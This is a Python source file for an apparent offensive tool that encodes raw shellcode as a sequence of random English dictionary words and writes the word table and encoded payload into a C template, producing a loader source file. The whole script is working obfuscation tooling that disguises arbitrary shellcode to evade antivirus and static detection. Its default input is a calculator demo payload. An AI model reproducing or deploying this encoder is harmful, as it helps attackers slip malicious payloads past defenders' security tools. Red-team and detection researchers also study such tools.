import random
import argparse
import sys

def gen_word_combinations(dict_file):
    # read in words dictionary
    try:
        with open(dict_file) as dictionary:
            words = dictionary.readlines()
    except FileNotFoundError:
        exit("\n\nThe dictionary you specified does not exist! Please specify a valid file path.\nExiting...\n")

    # Select random words from dictionary
    # why is this 257?  It fails at 256
    try:
        random_words = random.sample(words, 257)
        return random_words
    except ValueError:
        exit("\n\nThe dictionary file you specified does not contain at least 256 words!\nExiting...\n")

def get_shellcode(input_file):
    file_shellcode = b''
    try:
        with open(input_file, 'rb') as shellcode_file:
            file_shellcode = shellcode_file.read()
            file_shellcode = file_shellcode.strip()
            binary_code = ''

            for byte in file_shellcode:
                binary_code += "\\x" + hex(byte)[2:].zfill(2)

            raw_shellcode = "0" + ",0".join(binary_code.split("\\")[1:])

        return(raw_shellcode)
    
    except FileNotFoundError:
        exit("\n\nThe input file you specified does not exist! Please specify a valid file path.\nExiting...\n")


def build_template(translation_table, translated_shellcode, shellcode_length):
    with open("jargon_template.c") as tplate:
        template = tplate.read()
        template = template.replace("###SHELLCODE_LENGTH###", str(shellcode_length))
        template = template.replace("###TRANSLATION_TABLE###", translation_table)
        template = template.replace("###TRANSLATED_SHELLCODE###", translated_shellcode)

    with open("jargon.c", "w") as outfile:
        outfile.write(template)


def main():
    ### Parse our arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--dictionary", type=str,
                        help="Dictionary file. Defaults to 'dictionary.txt.'")
    parser.add_argument("-i", "--input", type=str,
                        help="File containing raw shellcode.")

    args = parser.parse_args()
    if len(sys.argv) == 1:
        # No arguments received.  Print help and exit
        parser.print_help(sys.stderr)
        sys.exit(0)

    if args.input:
        input_file = args.input
    else:
        input_file = "calc.bin"

    if args.dictionary:
        dict_file = args.dictionary
    else:
        dict_file = "dictionary.txt"

    '''
        Build translation table
    '''
    words = gen_word_combinations(dict_file)
    english_array = []
    for i in range(0, 256):
        english_array.append(words.pop(1).strip())

    '''
        Read and format shellcode
    '''
    shellcode = get_shellcode(input_file)
    sc_len = len(shellcode.split(','))

    '''
        Build translation table
    '''
    tt_index = 0
    translation_table = ''
    for word in english_array:
        translation_table = translation_table + '"' + word + '",'
        tt_index = tt_index + 1
    translation_table = translation_table.rstrip(', ')
    translation_table = translation_table.replace('XXX', str(tt_index))

    '''
        Translate shellcode using list comprehension
    '''
    translated_shellcode_generator = ('"{}"'.format(english_array[int(byte, 16)]) for byte in shellcode.split(','))
    translated_shellcode = ','.join(translated_shellcode_generator)
    translated_shellcode = translated_shellcode.strip(',\'')

    build_template(translation_table, translated_shellcode, sc_len)

    print("Original shellcode:")
    print(shellcode)


if __name__ == '__main__':
    main()
